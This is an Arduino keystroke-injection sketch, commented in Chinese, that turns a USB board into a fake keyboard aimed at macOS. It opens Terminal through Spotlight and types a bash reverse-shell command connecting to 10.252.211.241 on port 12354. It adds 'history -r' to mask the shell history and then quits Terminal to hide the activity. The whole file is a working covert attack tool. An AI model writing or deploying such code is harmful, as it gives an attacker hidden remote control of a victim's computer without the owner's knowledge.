#include<Keyboard.h>
void setup() {
  // 打开terminal
  Keyboard.begin();//开始键盘通讯
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);//win键
  delay(200);
  Keyboard.press(' ');
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(' ');
  delay(200);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(200);
  Keyboard.print("TERMINAL.APP");
  delay(300);
  Keyboard.println();
  Keyboard.println();
  delay(200);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);

  // 执行反弹shell
  Keyboard.println(" screen");
  Keyboard.println("");
  Keyboard.println(" bash");
  Keyboard.println("");
  delay(200);
  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1;history -r");
  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(' ');
  delay(200);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.release(' ');
  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1;history -r");
  delay(200);
  Keyboard.println();
  Keyboard.press(KEY_LEFT_GUI);//win键
  delay(200);
  Keyboard.press('q');
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('q');
  Keyboard.println("");
  

  Keyboard.end();//结束键盘通讯
}
void loop()//循环
{
}
